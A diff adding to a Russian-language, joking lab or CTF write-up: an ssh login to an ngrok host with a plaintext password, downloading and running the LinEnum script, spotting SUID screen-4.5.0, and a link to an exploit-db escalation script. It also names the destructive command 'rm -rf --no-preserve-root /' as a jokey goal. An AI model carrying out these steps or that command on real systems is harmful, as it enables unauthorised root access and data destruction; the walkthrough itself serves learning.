@@ -81,3 +81,39 @@ $ona_contexts=array (
 ssh andrew@9215fc5b9c9d.ngrok.io -p 17408
 ```
 А в поле для пароля пихаем `mH1XDvt7I,&6`, и мы вошли в нашего друга))
+
+Друзья, вы очень юморные я сидел и хохотал
+
+# 4) Обнаружение уязвимости для повышения прав пользователя
+ 
+ Скачиваем на машину скрипт [LinEnum](https://github.com/rebootuser/LinEnum) - невероятно весёлый bash-скрипт, который собирает всю инфу, которая может позволить стать рутом и прописать заветное `rm -rf --no-preserve-root /`. 
+ Скачиваем скрипт на машину с помощью [тулзы `wget`](https://www.gnu.org/software/wget/). Единственный аргумент здесь - адрес, с которого мы качаем ПрИкОлЬччИкИ =).
+ 
+ ```
+ $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2020-08-17 15:59:42--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.84.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.84.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/plain]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh                100%[===================================>]  45,54K  --.-KB/s    in 0,1s    
+
+2020-08-17 15:59:43 (369 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
+ ```
+ 
+ Далее позволяем скрипту запускаться и запускаем, уводя вывод в какой-нибудь другой файл.
+ ```
+ $ chmod u+x LinEnum.sh
+ $ ./LinEnum.sh > output
+ ```
+ 
+ Перекрестившись, открываем output и видим кучу строк кода. От незнания и чтобы сократить отчёт, допустим, что мы интуитивно открыли блок `SUID Files` и увидели в нём то, что мы можем запускать `/bin/screen-4.5.0` от рута. Приятно, что сказать.
+ 
+ # 5) Эксплуатация уязвимости
+ 
+ Находим [скрипт](https://www.exploit-db.com/exploits/41154), позволяющий успешно произвести эскалацию прав, копипастим его в отдельный файл .sh, позволяем запускаться и запускаем
+ 
+ # Победа B)
+ теперь вы рут и можете делать что хотите (в рамках закона и морали, но вот кстати вопрос: стоит ли следовать закону если всем подчиняющимся ему очевидна его бессмысленность и/или пагубное влияние?)
